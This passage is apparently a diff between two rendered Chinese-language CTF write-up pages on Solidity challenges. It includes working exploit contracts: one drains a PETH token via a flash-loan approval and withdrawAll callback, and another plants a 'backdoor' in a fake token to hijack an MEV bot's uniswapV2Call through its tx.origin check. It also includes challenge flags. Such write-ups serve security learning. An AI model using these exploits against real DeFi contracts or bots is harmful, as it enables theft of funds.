-<span class="w">        </span><span class="c1">// @dev if user gave me more Ether, refund it</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">userBalanceAfter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">userBalanceBefore</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">refund</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">userBalanceAfter</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">userBalanceBefore</span><span class="p">;</span>
-<span class="w">            </span><span class="nx">payable</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">).</span><span class="nx">sendValue</span><span class="p">(</span><span class="nx">refund</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">backdoor</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 区分模拟交易和实际套利交易</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">hacked</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span>
+<span class="w">                </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
+<span class="w">                </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
+<span class="w">                </span><span class="nx">IWETH</span><span class="p">(</span><span class="nx">weth</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">bot</span><span class="p">)),</span>
+<span class="w">                </span><span class="mf">0</span><span class="p">,</span>
+<span class="w">                </span><span class="kc">true</span>
+<span class="w">            </span><span class="p">);</span>
+<span class="w">            </span><span class="nx">bot</span><span class="p">.</span><span class="nx">uniswapV2Call</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">hacked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="c1">// ========== INTERNAL FUNCTION ==========</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">dst</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_burn</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_burnAll</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_burn</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">_userAddress</span><span class="p">]);</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-</details>
-<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<ul>
-<li>初始，<code>Setup</code> 合约向 <code>PETH</code> deposit 了 2500 ether，目标是清空 <code>PETH</code> 内的存款</li>
-<li>需要通过 <code>PigeonBank</code> 调用 <code>PETH</code> 的函数，可调用的函数包括 <code>deposit()</code>、<code>withdraw()</code>、<code>withdrawAll()</code> 和 <code>flashLoan()</code></li>
-<li>
-<p>首先关注 <code>flashLoan()</code>，由于不能直接向 <code>PETH</code> 发送 ETH，要么每次借贷金额为 0，要么使用 <code>selfdestruct</code> 返还给 <code>PETH</code>，但都不具备太大的价值</p>
-<div class="highlight"><pre><span></span><code><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">revert</span><span class="p">(</span><span class="s2">&quot;PETH: Do not send ETH directly&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
-<ul>
-<li>不过，<code>PETH.flashLoan()</code> 使用了 <code>Address.functionCallWithValue()</code>，即可以让 <code>PETH</code> 的实例调用任何函数 :D</li>
-</ul>
-</li>
-<li>
-<p>值得注意的是，在 <code>withdrawAll()</code> 中，首先向 <code>_userAddress</code> 发送其当前余额对应数量的 ETH，随后根据 <code>_userAddress</code> 的当前余额销毁代币，那么可以在回调函数中将代币 <code>transfer</code> 到受控地址（可以是 <code>PETH</code> 实例，使用 <code>flashLoan()</code> 调用 <code>approve</code>），从而逐步转移 <code>PETH</code> 持有的 ETH &gt; &lt;</p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">withdrawAll</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">).</span><span class="nx">sendValue</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">_userAddress</span><span class="p">]);</span>
-<span class="w">    </span><span class="nx">_burnAll</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">);</span>
-<span class="w">    </span><span class="c1">// require(success, &quot;SEETH: withdraw failed&quot;);</span>
-<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Withdrawal</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">_userAddress</span><span class="p">]);</span>
-<span class="p">}</span>
-
-<span class="kd">function</span><span class="w"> </span><span class="nx">_burn</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kd">function</span><span class="w"> </span><span class="nx">_burnAll</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">_burn</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">_userAddress</span><span class="p">]);</span>
-<span class="p">}</span>
-</code></pre></div>
-</li>
-</ul>
-<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.17</span><span class="p">;</span>
-
-<span class="kr">interface</span><span class="w"> </span><span class="nx">IPigeonBank</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">peth</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">IPETH</span><span class="p">);</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdrawAll</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kr">interface</span><span class="w"> </span><span class="nx">IPETH</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{}</span>
 <span class="p">}</span>
 
 <span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="nx">IPigeonBank</span><span class="w"> </span><span class="nx">bank</span><span class="p">;</span>
-<span class="w">  </span><span class="nx">IPETH</span><span class="w"> </span><span class="nx">peth</span><span class="p">;</span>
-<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="nx">onWithdraw</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// This will cost a lot of gas uwu</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">IUniswapV2Factory</span><span class="w"> </span><span class="nx">factory1</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">IUniswapV2Factory</span><span class="w"> </span><span class="nx">factory2</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">IWETH</span><span class="w"> </span><span class="nx">weth</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">bot</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">HackToken</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">HackToken</span><span class="p">(</span><span class="nx">bot</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">pair1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">factory1</span><span class="p">.</span><span class="nx">createPair</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">pair2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">factory2</span><span class="p">.</span><span class="nx">createPair</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
 
-<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">bank</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IPigeonBank</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">peth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bank</span><span class="p">.</span><span class="nx">peth</span><span class="p">();</span>
-<span class="w">    </span><span class="nx">bank</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">address</span><span class="p">(</span><span class="nx">peth</span><span class="p">),</span>
-<span class="w">        </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span>
-<span class="w">            </span><span class="s2">&quot;approve(address,uint256)&quot;</span><span class="p">,</span>
-<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
-<span class="w">            </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span>
-<span class="w">        </span><span class="p">),</span>
-<span class="w">        </span><span class="mf">0</span>
-<span class="w">    </span><span class="p">);</span>
-<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">;</span>
-<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">peth</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">peth</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">peth</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}();</span>
 
-<span class="w">        </span><span class="nx">bank</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">amount</span><span class="p">}();</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">IUniswapV2Pair</span><span class="p">(</span><span class="nx">pair1</span><span class="p">).</span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
 
-<span class="w">        </span><span class="nx">onWithdraw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">bank</span><span class="p">.</span><span class="nx">withdrawAll</span><span class="p">();</span>
-<span class="w">        </span><span class="nx">onWithdraw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
-
-<span class="w">        </span><span class="nx">peth</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">peth</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">bank</span><span class="p">.</span><span class="nx">withdrawAll</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="mf">0.2</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">IUniswapV2Pair</span><span class="p">(</span><span class="nx">pair2</span><span class="p">).</span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
 <span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">payable</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">));</span>
-<span class="w">  </span><span class="p">}</span>
-
-<span class="w">  </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">onWithdraw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">          </span><span class="nx">peth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">peth</span><span class="p">),</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
-<span class="w">      </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
-<h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
+<h4 id="flag_1">Flag<a class="headerlink" href="#flag_1" title="Permanent link">&para;</a></h4>
 <blockquote>
-<p>SEE{N0t_4n0th3r_r33ntr4ncY_4tt4ck_abb0acf50139ba1e468f363f96bc5a24}</p>
+<p>flag{S1MUl4t1oN_d0esnt_Gu4r4ntee_EXEcution_c0rr3ctne5555f5b9c201}</p>
+</blockquote>
+<h3 id="deaths-end_1">Death's End<a class="headerlink" href="#deaths-end_1" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>本小题的 <code>arbitrage()</code> 能够保证套利结束后合约持有 <code>WETH</code> 增加，其函数功能相当于 <code>multicall()</code></p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">arbitrage</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">addressList</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">calldataList</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;sender&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">WETH</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">addressList</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">calldataList</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">addressList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">addressList</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">call</span><span class="p">(</span><span class="nx">calldataList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">WETH</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;balance&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>uniswapV2Call()</code> 同样修改为了 <code>multicall()</code> 的形式，但仍然是对 <code>tx.origin</code> 进行验证</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">uniswapV2Call</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;origin&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">addressList</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">calldataList</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">[],</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[]));</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">addressList</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">calldataList</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">addressList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">addressList</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">call</span><span class="p">(</span><span class="nx">calldataList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>与 <a href="#the-dark-forest-1">The Dark Forest</a> 的思路类似，可以在套利交易中调用 <code>uniswapV2Call()</code> 来授予其它账户 <code>WETH</code> 的使用权，再在套利结束后取出 MEV bot 中的资金</p>
+</li>
+</ul>
+<h4 id="exploitation_2">Exploitation<a class="headerlink" href="#exploitation_2" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">HackToken</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">name</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hack Token&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">symbol</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;HT&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint8</span><span class="w">  </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">decimals</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">18</span><span class="p">;</span>
